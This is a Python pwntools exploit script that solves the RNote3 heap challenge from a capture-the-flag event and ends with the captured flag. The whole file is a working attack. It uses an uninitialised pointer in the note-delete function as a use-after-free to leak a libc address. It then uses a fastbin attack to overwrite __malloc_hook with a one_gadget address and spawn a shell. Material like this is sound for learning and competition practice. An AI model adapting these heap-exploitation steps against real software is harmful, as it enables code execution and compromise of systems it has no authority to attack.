#! /usr/bin/python

from pwn import *

# unininitialised current_note_ptr in delete funtion => UAF => leak
# fastbin attack

s = process('./RNote3')
#s = remote('rnote3.2018.teamrois.cn',7322)

def print_menu():
    for _ in range(6):
        print s.recvline()


def add_note(title, size, content):
    s.sendline('1')
    s.sendlineafter('title: ', title)
    s.sendlineafter('size: ', str(size))
    s.sendlineafter('content: ', content)
   

def view_note(title):
    s.sendline('2')
    s.sendlineafter('title: ', title)    
    s.recvline()
    return s.recvline()
    
def edit_note(title, content):
    s.sendline('3')
    s.sendlineafter('title: ', title)
    s.sendlineafter('content: ', content)
    

def delete_note(title):
    s.sendline('4')
    s.sendlineafter('title: ', title)
    
print_menu()

# ==== unininitialised ptr in delete funtion => UAF => leak 
add_note('AAAA', 0xf0, 'a' * 0x68)
add_note('BBBB', 0x70, 'b' * 0x70)
view_note('AAAA')
delete_note('x')
leak = view_note('\x00')[-7:-1:] + '\x00\x00'

leak = u64(leak)
#print 'leak =', hex(leak) # 0x7ffff7dd1b78
#libc : 0x7ffff7a0d000
#offset = 0x7ffff7dd1b78 - 0x7ffff7a0d000 = 0x3c4b78
libc_addr = leak - 0x3c4b78
log.info('libc_addr = ' + hex(libc_addr))
__malloc_hook_offset = 0x3c4b10
__malloc_hook_addr = libc_addr + __malloc_hook_offset
hook = __malloc_hook_addr - 0x23
one_gadget_offset = 0x4526a
one_gadget_addr = libc_addr + one_gadget_offset
log.info('__malloc_hook_addr = ' + hex(__malloc_hook_addr))
log.info('one_gadget_addr = ' + hex(one_gadget_addr))

realloc_offset = 0x846c0
realloc_addr = libc_addr + realloc_offset

# === fastbin attack
add_note('EEEE', 0x30, 'e' * 0x30)
add_note('CCCC', 0x60, 'c' * 0x60)
add_note('DDDD', 0x30, 'd' * 0x30)

view_note('CCCC')
delete_note('x')
edit_note('\x00', p64(hook))
add_note('FFFF', 0x60, 'f' * 0x60)
add_note('HHHH', 0x60, 'h' * 0x3 + p64(one_gadget_addr) + p64(one_gadget_addr) + p64(realloc_addr)) 
#add_note('HHHH', 0x60, 'h' * 0x13 + p64(one_gadget_addr))

'''
# 0x55555555526d:call 0x555555554c9b <-add
# 0x55555555527f:call 0x555555554e32 <-view
# 0x555555555291:call 0x55555555502d <-edit
# 0x5555555552a3:call 0x555555554f2b <-delete
# 0x555555554fd0:cmp QWORD PTR [rbp-0x18],0x0 <- cmp current_note_ptr, 0 before 2 free calls in delete
# 0x555555554f4e:call 0x5555555549c8 <- printf(please input note title) in delete
# 0x555555554cd1:call 0x555555554a00 <-first malloc call in add_note function
gdb.attach(s, 
"""
b * 0x555555554f2b
b * 0x555555554f4e
b * 0x555555554cd1
""")
'''

s.sendline('1')

s.interactive()
# RCTF{P1e4se_Be_C4refu1_W1th_Th3_P0inter_3c3d89}



























